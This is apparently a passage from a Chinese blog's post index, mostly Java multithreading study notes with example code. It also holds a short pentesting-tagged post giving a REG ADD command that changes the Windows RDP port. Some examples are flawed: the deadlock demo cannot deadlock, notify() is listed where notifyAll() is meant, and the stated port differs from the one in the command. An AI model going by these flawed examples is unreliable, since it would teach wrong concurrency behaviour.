*低优先级只是获得调度的概率低，并非一定是在高优先级线程之后才被调用\n *\n */\n\nclass HelloThread extends Thread{\n    @Override\n    public void run() {\n        for (int i = 0; i < 100; i++) {\n            if(i % 2 != 0){\n                try {\n                    sleep(1000); //抛出异常，需要try包裹起来(不能throws，因为不能比父类大，父类没有抛异常)\n                } catch (InterruptedException e) {\n                    e.printStackTrace();\n                }\n                System.out.println(Thread.currentThread().getName() + Thread.currentThread().getPriority() +  \"-- 奇数 --\" + i);\n            }\n\n            if(i % 20 ==0){\n//                this.yield();\n                yield();\n            }\n        }\n    }\n\n//    //也可以通过构造器方式给线程命名\n//    public HelloThread(String name){\n//        super(name);\n//    }\n}\n\n\n\npublic class ThreadMethod {\n    public static void main(String[] args) throws InterruptedException {\n//        HelloThread h1 = new HelloThread(\"线程线程1\");  //通过构造器方式给线程命名\n        HelloThread h1 = new HelloThread();\n        h1.setName(\"线程1\");\n        h1.setPriority(Thread.MAX_PRIORITY); //设置分线程的优先级\n\n        h1.start();\n\n        //给主线程命名\n        Thread.currentThread().setName(\"主线程\");\n        for (int i = 0; i < 100; i++) {\n            if(i % 2 == 0){\n                System.out.println(Thread.currentThread().getName() + Thread.currentThread().getPriority() + \":\" + i);\n            }\n            if(i == 20){\n                //调用了另外一个线程的join方法，等他执行完再继续回来执行\n                h1.join();   //需要加 throws\n            }\n        }\n        h1.isAlive();\n\n    }\n\n}\n\n```\n\n\n\n#### 线程的调度\n\n- 时间片\n- 抢占式：高优先级的线程抢占CPU\n\n\n\n**Java的调度方法**\n\n- 同优先级线程组成先进先出队列(先到先服务），使用时间片策略\n- 对高优先级，使用优先调度的抢占式策略\n\n\n\n**线程的优先级：**\n\n* `MAX_PRIORITY`:10\n* `MIN_PRIORITY`:1\n* `NORM_PRIORITY`:5\n\n\n\n**涉及的方法：**\n\n* `getPriority()`：返回线程优先级\n* `setPriority(int p)`:改变线程的优先级\n\n\n\n**说明：**\n\n* 线程创建时候继承父线程的优先级\n* 低优先级只是获得调度的概率低，并非一定是在高优先级线程之后才被调用\n\n\n\n### 线程的分类\n\n- 守护线程\n- 用户线程\n\n\n\n它们在几乎每个方面都是相同的，唯一的区别是判断JVM何时离开。\n\n守护线程是用来服务用户线程的，通过在`start()`方法前调用\n`thread.setDaemon(true)`可以把一个用户线程变成一个守护线程。\n\nJava垃圾回收就是一个典型的守护线程。\n若JVM中都是守护线程，当前JVM将退出。\n\n形象理解：兔死狗烹，鸟尽弓藏\n\n\n\n\n\n\n\n### 线程的生命周期\n\n> 这个生命周期流程图需要记住！！！\n\n![image-20210117085742806](http://image.xpshuai.cn/%E7%BA%BF%E7%A8%8B%E7%9A%84%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F.jpg)\n\n\n\n\n\n\n\n### 线程的同步(重难点)\n\n> 解决的是线程安全的问题\n\n**问题的提出：**\n\n多个线程执行的不确定性引起执行结果的不稳定\n多个线程对账本的共享，会造成操作的不完整性，会破坏数据。\n\n\n\n\n\n#### 解决线程安全问题共有三种方式：\n\n##### <font color=red>1.同步代码块</font>\n\n```java\npackage cn.xpshuai.java2;\n\n/**\n * @author: 剑胆琴心\n * @create 2021-01-17 9:14\n * @功能：使用同步代码块，解决前面通过实现Runnable方法实现的3个窗口同时卖100张票出现重票、错票的的线程安全问题\n\n 问题：出现了重票、错票-->出现了线程的安全问题\n 原因：当某个线程操作车票过程中，尚未操作完成时，其他线程参与进来，也操作车票\n 解决：当一个线程在操作贡献数据的时候，其他线程不能参与进来，直到线程A操作完其他线程才可以开始操作共享数据，\n        即是线程A出现了阻塞，也不能被改变。加锁。\n\n 在Java中：通过同步机制来解决线程的安全问题\n\n 方式1：同步代码块\n    synchronized(同步监视器){\n        //需要被同步的代码：即操作共享数据(多个线程共同操作的变量)的代码(不能包含代码多了，也不能包含代码少了-->只包含操作的代码)\n    }\n    说明：同步监视器-->俗称：锁。任何一个类的对象都可以充当锁\n                  要求：多个线程必须共用同一把锁(唯一的)\n\n    同步的方式：解决了线程的安全问题 -- 好处\n               操作同步代码时，只能有一个线程参与，其他线程等待，相当于是一个单线程的过程，效率低  --不足之处\n\n    补充: 在实现Runnable接口创建多线程的方法中，我们可以考虑使用this作为同步监视器\n\n\n\n  方式2：同步方法\n        如果操作共享数据的代码完整的声明在一个方法中，我们不妨将此方法声明为同步的\n        synchronized 操作方法_name(){\n                //操作共享数据的代码块\n        }\n     关于同步方法的总结:\n     1.同步方法仍然涉及到同步监视器，只是不需要我们显式的声明。\n     2．非静态的同步方法，同步监视器是:this\n        静态的同步方法，同步监视器是:当前类本身\n\n */\npublic class ThreadCase4 {\n    public static void main(String[] args) {\n        Windows2 w = new Windows2();\n\n        Thread t1 = new Thread(w);\n        Thread t2 = new Thread(w);\n        Thread t3 = new Thread(w);\n\n        t1.setName(\"窗口1\");\n        t2.setName(\"窗口2\");\n        t3.setName(\"窗口3\");\n\n        t1.start();\n        t2.start();\n        t3.start();\n    }\n\n}\n\n\n\nclass Windows2 implements Runnable{\n    private int tickets = 100;  //共享数据\n//    Object obj = new Object();  //这里的对象是唯一的就行(多个线程用的是同一个)\n\n    @Override\n    public void run() {\n        while (true){ // synchronized不能包多，比如不能把while(true)包进来-->否则就成了只有一个窗口卖票了\n            //\n            synchronized(Windows2.class){  //监视器方式1：这里可以用当前类作为监视器(类也是对象)，是唯一的(只会加载一次)\n//            监视器方式2：synchronized (obj){ //这里不能用this(代表t1,t2,t3对象，不唯一)作为同步监视器\n                if (tickets > 0){\n                    try {\n                        Thread.sleep(100); //先加了sleep强制阻塞，让出现错票的概率提升了\n                    } catch (InterruptedException e) {\n                        e.printStackTrace();\n                    }\n\n                    System.out.println(Thread.currentThread().getName() + \":卖票，票号为：\" + tickets);\n                    tickets--;\n                }else {\n                    break;\n                }\n            }\n        }\n    }\n}\n\n```\n\n```java\npackage cn.xpshuai.java2;\n\n/**\n * @author: 剑胆琴心\n * @create 2021-01-17 9:47\n * @功能： 使用同步代码块，解决前面通过继承Thread方式实现的3个窗口同时卖100张票出现重票、错票的的线程安全问题\n    说明：在通过继承Thread创建多方式，慎用this作为同步监视器，考虑使用当前类作为同步监视器（考虑是不是唯一的）\n\n\n */\npublic class ThreadCase5 {\n    public static void main(String[] args) {\n        Windows w1 = new Windows();\n        Windows w2 = new Windows();\n        Windows w3 = new Windows();\n\n        w1.setName(\"窗口1\");\n        w2.setName(\"窗口2\");\n        w3.setName(\"窗口3\");\n\n        w1.start();\n        w2.start();\n        w3.start();\n    }\n\n}\n\n\nclass Windows extends Thread{\n    private static int tickets = 100; //加了static也不对，需要解决线程安全问题\n//    private static Object obj = new Object(); //不唯一，所以加static\n\n    @Override\n    public void run() {\n        while (true){\n            //  监视器方式1：为了更简便,用当前对象来作为监视器，这里的this：唯一的Window对象\n            synchronized(this){ // 监视器方式2：synchronized(obj)\n                if (tickets > 0){\n                    try {\n                        Thread.sleep(100); //使得错票概率变大\n                    } catch (InterruptedException e) {\n                        e.printStackTrace();\n                    }\n\n                    System.out.println(Thread.currentThread().getName() + \":卖票，票号为：\" + tickets);\n                    tickets--;\n                }else {\n                    break;\n                }\n            }\n        }\n    }\n}\n\n\n```\n\n\n\n##### <font color=red>2.同步方法</font>\n\n```java\npackage cn.xpshuai.java2;\n\n/**\n * @author: 剑胆琴心\n * @create 2021-01-17 10:04\n * @功能：使用同步方法，解决通过Runnable实现的抢票的安全问题\n *\n *\n *\n *【关于同步方法的总结】:\n * 1.同步方法仍然涉及到同步监视器，只是不需要我们显式的声明。\n * 2．非静态的同步方法，同步监视器是:this\n *    静态的同步方法，同步监视器是:当前类本身\n *\n *\n *\n *\n */\npublic class ThreadCase6 {\n    public static void main(String[] args) {\n        Windows3 w = new Windows3();\n\n        Thread t1 = new Thread(w);\n        Thread t2 = new Thread(w);\n        Thread t3 = new Thread(w);\n\n        t1.setName(\"窗口1\");\n        t2.setName(\"窗口2\");\n        t3.setName(\"窗口3\");\n\n        t1.start();\n        t2.start();\n        t3.start();\n    }\n\n}\n\n\n\nclass Windows3 implements Runnable{\n    private int tickets = 100;  //共享数据\n\n    @Override\n    public void run() {\n        while (true){\n                show();\n            }\n        }\n\n    // 同步监视器：this，只是省略了没写\n    private synchronized void show(){ //把操作代码单独提出来，不能多提也不能少提\n        if (tickets > 0){\n            try {\n                Thread.sleep(100); //先加了sleep强制阻塞，让出现错票的概率提升了\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n\n            System.out.println(Thread.currentThread().getName() + \":卖票，票号为：\" + tickets);\n            tickets--;\n        }\n    }\n}\n\n```\n\n```java\npackage cn.xpshuai.java2;\n\n/**\n * @author: 剑胆琴心\n * @create 2021-01-17 10:10\n * @功能： 使用同步方法，解决通过继承Thread类的方式实现的抢票的安全问题\n */\npublic class ThreadCase7 {\n    public static void main(String[] args) {\n        Windows4 w1 = new Windows4();\n        Windows4 w2 = new Windows4();\n        Windows4 w3 = new Windows4();\n\n        w1.setName(\"窗口1\");\n        w2.setName(\"窗口2\");\n        w3.setName(\"窗口3\");\n\n        w1.start();\n        w2.start();\n        w3.start();\n    }\n\n}\n\n\nclass Windows4 extends Thread{\n    private static int tickets = 100; //加了static也不对，需要解决线程安全问题\n\n    @Override\n    public void run() {\n        while (true){\n            show();\n        }\n    }\n\n    private static synchronized void show(){  //把方法写出静态的，监视器唯一(为Windows.class)，正确\n//    private synchronized void show(){   按照前面的方式直接加synchronized是不行的(因为监视器不是唯一的同一个)，错误的写法\n        if (tickets > 0){\n            try {\n                Thread.sleep(100); //使得错票概率变大\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n\n            System.out.println(Thread.currentThread().getName() + \":卖票，票号为：\" + tickets);\n            tickets--;\n        }\n    }\n\n}\n\n```\n\n\n\n**将单例模式的懒汉式，改成线程安全的：**\n\n```java\npackage cn.xpshuai.java2;\n\n/**\n * @author: 剑胆琴心\n * @create 2021-01-17 10:27\n * @功能：使用同步机制，将单例模式的懒汉式，改成线程安全的\n */\npublic class BankTest {\n    \n}\n\n\nclass Bank{\n    private Bank(){\n\n    }\n    private static Bank instance = null;\n    //懒汉式\n\n    public static  Bank getInstance() { //同步锁为当前类本身(Bank.class)\n//方式1(同步代码块/同步方法)：效率稍差\n//        synchronized(Bank.class){\n//            if(instance == null){\n//                instance = new Bank();\n//            }\n//            return instance;\n//        }\n        //方式2：效率较高\n        if(instance == null){ //双重检查\n            synchronized(Bank.class){\n                if(instance == null){\n                    instance = new Bank();\n                }\n            }\n        }\n\n        return instance;\n    }\n    \n}\n```\n\n\n\n##### <font color=red>3.Lock锁方式</font>\n\n\n\n**死锁的问题：**\n\n**死锁：**\n\n不同的线程分别占用对方需要的同步资源不放弃，都在等待对方放弃自己需要的同步资源，就形成了线程的死锁  \n出现死锁后，不会出现异常，不会出现提示，只是所有的线程都处于阻塞状态，无法继续  \n\n**解决方法：**\n\n- 专门的算法、原则\n- 尽量减少同步资源的定义>尽量避免嵌套同步\n\n\n\n死锁例子：\n\n```java\npackage cn.xpshuai.java2;\n\n/**\n * @author: 剑胆琴心\n * @create 2021-01-17 10:42\n * @功能：出现了死锁\n *\n *\n *1.死锁的理解:不同的线程分别占用对方需要的同步资源不放弃，都在等待对方放弃自己需要的同步资源，就形成了线程的死锁\n * \n *2.说明:\n * 1）出现死锁后，不会出现异常，不会出现提示，只是所有的线程都处于阻塞状态，无法继续\n * 2）我们使用同步时,要避免出现死锁。|\n *\n */\npublic class LuckTest {\n    public static void main(String[] args) {\n        StringBuffer s1 = new StringBuffer();\n        StringBuffer s2 = new StringBuffer();\n\n        // 用匿名方式写继承Thread类的方式\n        new Thread(){\n            @Override\n            public void run() {\n                synchronized (s1){\n                    s1.append(\"a\");\n                    s2.append(\"1\");\n\n                    try {\n                        Thread.sleep(100);  //增加死锁出现的概率\n                    } catch (InterruptedException e) {\n                        e.printStackTrace();\n                    }\n\n                    synchronized (s2){\n                        s1.append(\"b\");\n                        s2.append(\"2\");\n\n                        System.out.println(s1);\n                        System.out.println(s2);\n                    }\n                }\n            }\n        }.start();\n\n        // 用匿名方式写实现Runnable接口的方式\n        new Thread(new Runnable() {\n            @Override\n            public void run() {\n                synchronized (s2){\n                    s1.append(\"c\");\n                    s2.append(\"3\");\n\n                    try {\n                        Thread.sleep(100);  //增加死锁出现的概率\n                    } catch (InterruptedException e) {\n                        e.printStackTrace();\n                    }\n\n                    synchronized (s2){\n                        s1.append(\"d\");\n                        s2.append(\"4\");\n\n                        System.out.println(s1);\n                        System.out.println(s2);\n                    }\n                }\n            }\n        }).start();\n    }\n}\n\n```\n\n\n\n**Lock锁方式解决线程安全问题：**\n\n![image-20210117110948119](http://image.xpshuai.cn/Lock%E9%94%81.png)\n\n```java\npackage cn.xpshuai.java2;\n\nimport java.util.concurrent.locks.ReentrantLock;\n\n/**\n * @author: 剑胆琴心\n * @create 2021-01-17 11:10\n * @功能：解决线程安全问题的方式三：Lock锁 -- JDK5.0新增\n *\n\n步骤在下面的例子中：\n1.实例化一个ReentrantLock对象(若设置为true，为公平，先进先出；不写就是false)\n2.调用lock()锁定方法\n3.调用解锁方法unlock()\n\n\n\n面试题：synchronized与lock异同\n 同：二者都可以解决线程安全问题\n 异：synchronized机制在执行完相应的同步代码之后，自动释放同步监视器\n     Lock需要手动的启动同步(lock())，同时结束同时也需要手动的实现(unlock())\n\n 建议优先用Lock这种手动方式\n 优先使用顺序：\n    Lock →同步代码块（已经进入了方法体，分配了相应资源）→同步方法（在方法体之外)\n\n\n *\n */\npublic class LuckTest2 {\n    public static void main(String[] args) {\n        Window w = new Window();\n\n        Thread t1 = new Thread(w);\n        Thread t2 = new Thread(w);\n        Thread t3 = new Thread(w);\n\n        t1.setName(\"窗口1\");\n        t2.setName(\"窗口2\");\n        t3.setName(\"窗口3\");\n\n        t1.start();\n        t2.start();\n        t3.start();\n    }\n\n\n\n}\n\n\nclass Window implements Runnable{\n    private int ticket = 100;\n\n//    1.实例化一个ReentrantLock对象(若设置为true，为公平，先进先出；不写就是false)\n    private ReentrantLock lock = new ReentrantLock(true);\n\n    @Override\n    public void run() {\n        while (true){\n            try{\n                //2.调用lock()锁定方法\n                lock.lock();\n                if (ticket > 0){\n                    try {\n                        Thread.sleep(100); //先加了sleep强制阻塞，让出现错票的概率提升了\n                    } catch (InterruptedException e) {\n                        e.printStackTrace();\n                    }\n\n                    System.out.println(Thread.currentThread().getName() + \":卖票，票号为：\" + ticket);\n                    ticket--;\n                }else {\n                    break;\n                }\n            }finally {\n    //            3.调用解锁方法unlock()\n                lock.unlock();\n            }\n        }\n    }\n}\n\n```\n\n\n\n**synchronized与Lock，二者对比：**\n\n1.  Lock是显式锁（手动开启和关闭锁，别忘记关闭锁），synchronized是隐式锁，出了作用域自动释放\n2.  Lock只有代码块锁，synchronized有代码块锁和方法锁\n3. 使用Lock锁，JVM将花费较少的时间来调度线程，性能更好。并且具有更好的扩展性(提供更多的子类)\n\n\n\n**优先使用顺序:**\nLock →同步代码块（已经进入了方法体，分配了相应资源）→同步方法(在方法体之外)|\n\n\n\n\n\n\n\n\n\n\n\n### 线程的通信\n\n> 其实就是几个方法的使用\n\n\n\n```java\npackage cn.xpshuai.java3;\n\n/**\n * @author: 剑胆琴心\n * @create： 2021-01-17 14:12\n * @功能：线程通信的例子，一个线程打印偶数，一个线程打印奇数, 交替打印\n *\n *\n *设计到的三个方法：\n * wait():一旦执行此方法，当前线程就进入阻塞状态，并释放同步监视器\n * notify(): 一旦执行此方法，就会唤醒被wait的一个线程。如果有多个线程被wait，就唤醒优先级高的那个。\n * notify():一旦执行此方法,就会唤醒所有被wait的线程。\n *\n * 说明：\n * 1.wait(),notify(),notify()以上三个方法必须出现在同步代码块或者同步方法当中，不能用在lock()的情况下\n * 2.这三个方法的调用者必须是同步代码块或者同步方法当中的同步监视器，否则会出异常\n * 3.这三个方法是定义在java.lang.Object中的\n *\n */\npublic class NumTest {\n    public static void main(String[] args) {\n        Number n = new Number();\n        Thread t1 = new Thread(n);\n        Thread t2 = new Thread(n);\n\n        t1.setName(\"线程1\");\n        t2.setName(\"线程2\");\n\n        t1.start();\n        t2.start();\n\n    }\n}\n\n\nclass Number implements Runnable{\n    private int number = 1;\n//    Object obj = new Object();\n\n    @Override\n    public void run() {\n        while (true){\n            synchronized (this){\n//            synchronized (obj){\n                notify(); // 2.唤醒另一个线程\n//                this.notify(); // 2.唤醒另一个线程\n//                obj.notify(); // 如果同步代码块中同步监视器为Object，调用这个方法也必须为obj\n//                notifyAll();  // 唤醒其他所有线程\n\n                if(number <= 100){\n                    System.out.println(Thread.currentThread().getName() + \":\" + number);  //查看线程名\n                    number++;\n\n                    try {\n                        wait();  //1.让调用wait()的线程进入阻塞状态\n//                        obj.wait();\n                    } catch (InterruptedException e) {\n                        e.printStackTrace();\n                    }\n\n                }else {\n                    break;\n                }\n            }\n        }\n    }\n}\n\n\n```\n\n\n\n**面试题：**sleep()和wait的异同\n\n```java\n1.相同点:一旦执行方法，都可以使得当前的线程进入阻塞状态。\n2.不同点:\n\t1）两个方法声明的位置不同:Thread类中声明sleep() , object类中声明wait()\n\t2）调用的要求不同: sleep()可以在任何需要的场景下调用。而wait()必须使用在同步代码块或同步方法中调用\n\t3) 关于是否释放同步监视器，如果两个方法都使用在同步代码块或同步方法中，sleep()不会释放锁，wait()会释放锁(同步监视器)\n\n```\n\n\n\n**经典例题：生产者/消费者问题**\n\n```java\npackage cn.xpshuai.java3;\n\n/**\n * @author: 剑胆琴心\n * @create: 2021-01-17 14:42\n * @功能：生产者/消费者问题的例子\n *\n *\n * 生产者(Productor)将产品交给店员(CLerk)，而\n * 消费者(Customer)从店员处取走产品，\n * 店员一次只能持有固定数量的产品(比如:20)，\n * 如果生产者试图生产更多的产品，店员会叫生产者停一下，\n * 如果店中有空位放产品了再通知生产者继续生产，\n * 如果店中没有产品了，店员会告诉消费者等一下，\n * 如果店中有产品了再通知消费者来取走产品。\n *\n *\n * 涉及：同步机制、多线程通信\n *\n *\n */\npublic class ProducerCustomer {\n    public static void main(String[] args) {\n        Clerk clerk = new Clerk();  //这个对象自始至终只造了一个\n\n        Producer p1 = new Producer(clerk);\n        p1.setName(\"生产者1\");\n\n        Customer c1 = new Customer(clerk);\n        c1.setName(\"消费者1\");\n        \n        p1.start();\n        c1.start();\n\n        \n\n    }\n}\n\nclass Clerk{\n    private int productCount = 0;\n\n    //生产产品\n    public synchronized void produceProduct()  { //用同步方法\n        if(productCount < 20){\n            productCount++;\n            System.out.println(Thread.currentThread().getName() + \":开始生产第\" + productCount + \"个产品\");\n            notify();  //唤醒消费者\n        }else {\n            //等待\n            try{\n                wait();\n            }catch (InterruptedException e){\n                e.printStackTrace();\n            }\n        }\n\n    }\n\n    //消费产品\n    public synchronized void consumeProduct(){\n        if(productCount > 0){\n            System.out.println(Thread.currentThread().getName() + \":开始消费第\" + productCount + \"个产品\");\n            productCount--;\n            notify();  //唤醒生产者\n        }else {\n            //等待\n            try{\n                wait();\n            }catch (InterruptedException e){\n                e.printStackTrace();\n            }\n        }\n\n    }\n}\n\n\nclass Producer extends Thread{ //生产者\n    private Clerk clerk;\n\n    public Producer(Clerk clerk) {\n        this.clerk = clerk;\n    }\n\n    @Override\n    public void run() {\n        System.out.println(Thread.currentThread().getName() + \":开始生产产品...\");\n        while (true){\n            clerk.produceProduct();\n        }\n    }\n}\n\n\nclass Customer extends Thread{ //消费者\n    private Clerk clerk;\n\n    public Customer(Clerk clerk) {\n        this.clerk = clerk;\n    }\n\n    @Override\n    public void run() {\n        System.out.println(Thread.currentThread().getName() + \":开始消费产品...\");\n        while (true){\n            clerk.consumeProduct();\n        }\n    }\n}\n\n```\n\n\n\n\n\n### JDK5.0新增线程创建方式\n\n> 2种方法\n\n\n\n#### <font color=red>方法3：实现Callable接口</font>\n\n与使用`Runnable`相比，`Callable`功能更强大些：\n\n- 相比重写`run()`方法，可以有返回值(重写`call()`方法)\n- 方法可以抛出异常\n- 支持泛型的返回值\n- 需要借助`FutureTask`类，比如获取返回结果\n\n\n\n**Future接口：**\n\n- 可以对具体Runnable、Callable任务的执行结果进行取消、查询是否完成、获取结果等；\n- `FutrueTask`是Futrue接口的**唯一**的实现类\n- FutureTask同时实现了Runnable,Future接口。它既可以作为Runnable被线程执行，又可以作为Future得到Callable的返回值\n\n\n\n\n\n```java\npackage cn.xpshuai.java3;\n\nimport java.util.concurrent.Callable;\nimport java.util.concurrent.ExecutionException;\nimport java.util.concurrent.FutureTask;\n\n/**\n * @author: 剑胆琴心\n * @create: 2021-01-17 15:0\n * @功能：创建线程的方式三: 实现Callable接口 -- JDK5.0新增\n *\n *\n *步骤：\n *1.创建一个Callable的实现类\n *2.实现call方法，将此线程需要执行的操作声明在call()中\n *3.创建Callable接口实现类的对象\n *4.将此Callable接口实现类的对象作为传递到FutureTask构造器中，创建FutureTask的对象\n *5.将FutureTask的对象作为参数，传递到Thread类的构造器中，创建Thread对象，并调用start()\n *6.获取Callable中call()方法的返回值\n *\n *\n * 如何理解实现Callable接口的方式创建多线程，比实现Runnable接口创建多线程方式强大？\n * 1.call()可以由返回值\n * 2.call()可以抛出异常，被外面的操作捕获，获取异常的信息\n * 3.Callable是支持泛型的\n *\n *\n *\n * */\n\npublic class CallableTest {\n    public static void main(String[] args) {\n//        3.创建Callable接口实现类的对象\n        NumThread n1 = new NumThread();\n//        4.将此Callable接口实现类的对象作为传递到FutureTask构造器中，创建FutureTask的对象\n        FutureTask futureTask = new FutureTask(n1);\n//        FutureTask<Integer> futureTask = new FutureTask<Integer>(n1);\n//        5.将FutureTask的对象作为参数，传递到Thread类的构造器中，创建Thread对象，并调用start()\n        new Thread(futureTask).start();\n\n        try {\n//            6.获取Callable中call()方法的返回值\n            //get()返回值即为FutureTask构造器参数Callable实现类重写的的call()的返回值\n            Object sum = futureTask.get(); //获取回调方法的返回值, 如果对返回值不感兴趣可以不用调用这个get()\n//            Integer sum = futureTask.get();\n            System.out.println(\"总和为：\" + sum);\n\n        } catch (InterruptedException e) {\n            e.printStackTrace();\n        } catch (ExecutionException e) {\n            e.printStackTrace();\n        }\n\n\n    }\n}\n\n\n//1.创建一个Callable的实现类\nclass NumThread implements Callable{\n//class NumThread implements Callable<Integer>{\n//    2.实现call方法，将此线程需要执行的操作声明在call()中\n    @Override\n    public Object call() throws Exception {\n//    public Integer call() throws Exception {\n        int sum = 0;\n        for (int i = 0; i < 100; i++) {\n            if (i % 2 == 0){\n                System.out.println(i);\n                sum += i;\n            }\n        }\n        return sum;\n    }\n}\n\n```\n\n\n\n\n\n#### <font color=red>方法4：线程池</font>\n\n> 开发中，常用这个方法\n\n\n\n**背景: **经常创建和销毁、使用量特别大的资源，比如并发情况下的线程，对性能影响很大。\n\n**思路:** 提前创建好多个线程，放入线程池中，使用时直接获取，使用完放回池中。可以避免频繁创建销毁、实现重复利用。类似生活中的公共交通工具。\n\n**好处:**\n\n- 提高响应速度（减少了创建新线程的时间)\n- 降低资源消耗（重复利用线程池中线程,不需要每次都创建)\n- 便于线程管理\n  - corePoolSize: 核心池的大小\n  - maximumPoolSize: 最大线程数\n  - keepAliveTime: 线程没有任务时最多保持多长时间后会终止\n  - ... ...\n\n![image-20210117153400642](http://image.xpshuai.cn/java_ExecutorService.png)\n\n\n\n\n\n```java\npackage cn.xpshuai.java3;\n\nimport java.util.concurrent.ExecutorService;\nimport java.util.concurrent.Executors;\nimport java.util.concurrent.ThreadPoolExecutor;\n\n/**\n * @author: 剑胆琴心\n * @create: 2021-01-17 15:37\n * @功能：创建线程的方式4：线程池\n *\n * 【步骤】\n * 1.提供指定线程数量的线程池\n * 2.执行指定的线程的操作，需要提供实现了Runnable接口或Callable接口实现类的对象\n * 3.关闭线程池\n *\n * 【好处】\n * - 提高响应速度（减少了创建新线程的时间)\n * - 降低资源消耗（重复利用线程池中线程,不需要每次都创建)\n * - 便于线程管理\n *\n *\n *\n * 新手本例子可能出现的问题：http://www.voidcn.com/article/p-zkcigdhf-bud.html\n *\n */\npublic class ThreadPool {\n    public static void main(String[] args) {\n//        1.提供指定线程数量的线程池\n        ExecutorService service = Executors.newFixedThreadPool(10);   // newFixedThreadPool方法是类Executors的静态方法.\n\n//        设置线程池的属性, 这里\n        System.out.println(service.getClass());  // class java.util.concurrent.ThreadPoolExecutor\n        ThreadPoolExecutor service1 = (ThreadPoolExecutor)service; // 必须强转为这种形式才能设置属性\n//        service1.setCorePoolSize(15);\n//        service1.setKeepAliveTime(1000);\n\n//        2.执行指定的线程的操作，需要提供实现了Runnable接口或Callable接口实现类的对象\n        service.execute(new NumberThread());  //适合使用于Runnable\n        service.execute(new NumberThread2());  //适合使用于Runnable\n//        service.submit(Callable callable); //适合使用于Callable\n\n//        3.关闭线程池\n        service.shutdown();\n    }\n}\n\nclass NumberThread implements Runnable{\n    @Override\n    public void run() {\n        for (int i = 0; i <= 100; i++) {\n            if (i % 2 == 0) {\n                System.out.println(Thread.currentThread().getName() + \"偶数：\" + i);\n\n            }\n        }\n    }\n}\n\nclass NumberThread2 implements Runnable{\n    @Override\n    public void run() {\n        for (int i = 0; i <= 100; i++) {\n            if (i % 2 != 0) {\n                System.out.println(Thread.currentThread().getName() + \"奇数：\" + i);\n\n            }\n        }\n    }\n}\n\n\n\n\n```\n\n\n\n\n\n\n\n\n\n\n\n","tags":["多线程"],"categories":["Java学习"]},{"title":"一条命令修改windows注册表","url":"%2Fposts%2F48777%2F","content":"\n> 在网上看到大佬们的文章，我也在此记录以下\n\n\n\n这里以修改windows远程桌面端口3389为33333为例子。\n\n修改注册表，命令如下：\n\n```shell\nREG ADD “HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp” /v “PortNumber” /t REG_DWORD /d 3333 /f\n```\n\n","tags":["注册表"],"categories":["渗透测试"]},{"title":"Java学习之异常","url":"%2Fposts%2F39908%2F","content":"\n\n\n### 常见异常\n\n\n\n- Error：Java虚拟机无法解决的严重问题，如StackOverflowErroe等，一般不编写针对性代码进行处理\n\n- Exception：其它因编程错误或偶然的外在因素导致的一般性问题，可以伎用针对性的代码进行处理。例如：空指针访问、试图读取不存在的文件、网络连接中断、数组角标越界等\n\n\n\n**分类：**\n\n- 编译时异常\n- 运行时异常\n\n\n\n捕获错误最理想的是在编译期间。\n\n\n\n### 异常处理1：try-catch-finally\n\n```java\npackage cn.xpshuai.day12;\n/*\n异常处理机制\n\nError: JVM系统内部错误,一般不不编写针对性代码进行处理\n        比如栈溢出，OOM（堆空间溢出）\nException:\n        编译时异常：编译器会自动变红叉, javac会异常，不会生成字节码文件都\n        运行时异常：\n\n异常的处理:抓抛模型\n过程一:\"抛\":程序在正常执行的过程中，一旦出现异常，就会在异常代码处生成一个对应异常类的对象。\n并将此对象抛出。\n    一旦抛出对象以后，其后的代码就不再执行。\n\n过程二:\"抓\":可以理解为异常的处理方式: 1.try-catch-finally  2.throws\n\n\n\n\ntry-catch-finally使用\ntry{\n    可能出现异常的代码\n}catch(异常类型1 变量名1){\n}catch(异常类型2 变量名2){\n}catch(异常类型3 变量名3){\n}finally{\n    一定会执行的代码放在这里\n}\n\n说明：\n1.finally是可选的。\n2．使用try将可能出现异常代码包装起来，在执行过程中，一旦出现异常，就会生成一个对应异常类的对象，根据此对象\n的类型，去catch中进行匹配\n3.catch中的异常类型如果没有子父类关系，则谁声明在上，谁声明在下无所谓。\n  catch中的异常类型如果满足子父类关系，则要求子类一定声明在父类的上面。否则，报错\n\n4.常用的异常对象处理的方式:\n    String getMessage()\n    printstackTrace()\n\n\n5.在try结构中声明的变量，再出了try结构以后，就不能再被调用\n\n6.体会:使用try-catch-finally处理编译时异常，是得程序在编译时就不再报错，但是运行时仍可能报错。\n      相当于我们使用try-catch-finally将一个编译时可能出现的异常,延迟到运行时出现。\n\n\n7.finally中的是一定会执行的代码，即使catch中又出现异常了，try中有return语句，catch中有return语句等情况。\n\n\n8.像数据库连接、输入输出流、网络编程Socket等资源，JVMN是不能自动的回收的，我们需要自己手动的进行资源的\n释放。此时的资源释放，就需要声明在finally中。\n\n9. try-catch可以相互嵌套\n\n10.开发中，由于运行时异常比较常见，所以我们通常就不针对运行时异常编写try-catch-finally针对于编译时异常，我们说一定要考虑异常的处理。\n运行时异常不一定非要try-catch，但编译时异常一定要加\n\n */\n\nimport org.junit.Test;\nimport org.junit.internal.runners.statements.ExpectException;\n\nimport java.io.File;\nimport java.io.FileInputStream;\nimport java.io.FileNotFoundException;\nimport java.io.IOException;\nimport java.util.Date;\nimport java.util.Scanner;\n\npublic class ExceptionTest {\n\n    // Error\n    @Test\n    public void testError() {\n//        testError();  //栈溢出\n//        Integer[] arr = new Integer[1024*1024*1024];  //OOM 堆空间溢出\n    }\n\n\n    @Test\n    public void testException() {\n        String a;\n        try{\n            a = \"123\";\n            System.out.println(a.charAt(6)); // java.lang.StringIndexOutOfBoundsException\n        }catch (StringIndexOutOfBoundsException e){\n//            System.out.println(\"出现了StringIndexOutOfBoundsException异常\");\n            System.out.println(e.getMessage());\n//            e.printStackTrace();\n        }catch (Exception e2){\n            System.out.println(\"出现了其他异常2\");\n        }finally {\n            System.out.println(\"finally继续执行其他语句\");\n        }\n    }\n\n    @Test\n    public void testException2() {\n//       Object obj = new Date();\n//       String str = (String) obj;   // java.lang.ClassCastException\n\n//        Scanner scanner = new Scanner(System.in);\n//        int score  = scanner.nextInt();\n//        System.out.println(score);\n//        scanner.close();\n\n//        int a = 10;\n//        int b = 0;\n//        System.out.println(a/b);  // java.lang.ArithmeticException:\n    }\n\n    @Test\n    public void testTryCatch() {\n        FileInputStream fis = null;\n        try {\n                File file = new File(\"test.txt\");\n                fis = new FileInputStream(file);\n                int data = fis.read();\n          